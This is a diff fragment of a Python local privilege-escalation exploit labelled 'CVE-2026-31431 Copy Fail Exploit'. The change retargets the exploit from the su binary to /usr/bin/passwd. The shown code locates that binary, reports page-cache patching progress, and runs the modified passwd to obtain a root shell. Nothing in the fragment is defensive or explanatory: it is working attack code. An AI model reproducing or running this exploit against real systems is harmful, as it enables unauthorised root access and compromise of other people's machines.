@@ -111,18 +111,18 @@ def c(f, t, payload):
     u.close()
     a.close()
 
-# Target the su binary
-TARGET_BINARY = "/bin/su"  # Primary target (most systems)
-FALLBACK_TARGET = "/usr/bin/su"  # Fallback for some distributions
+# Target the passwd binary
+TARGET_BINARY = "/usr/bin/passwd"  # Primary target
+FALLBACK_TARGET = "/bin/passwd"    # Fallback for some distributions
 
 def set_target():
-    """Determine which su binary exists and should be targeted"""
+    """Determine which passwd binary exists and should be targeted"""
     if os.path.exists(TARGET_BINARY):
         return TARGET_BINARY
     elif os.path.exists(FALLBACK_TARGET):
         return FALLBACK_TARGET
     else:
-        raise FileNotFoundError(f"Could not find su binary. Tried: {TARGET_BINARY}, {FALLBACK_TARGET}")
+        raise FileNotFoundError(f"Could not find passwd binary. Tried: {TARGET_BINARY}, {FALLBACK_TARGET}")
 
 # Main exploit
 print("[*] CVE-2026-31431 Copy Fail Exploit")
@@ -158,8 +158,8 @@ while i < len(e):
         print(f"    Written {i}/{len(e)} bytes...")
 
 print("[+] Page cache patching complete!")
-print("[+] Executing modified su...")
+print("[+] Executing modified passwd to gain root...")
 print()
 
-# Execute patched su - should give root
-os.system(f"su")
+# Execute patched passwd - should give root shell
+os.system("passwd")
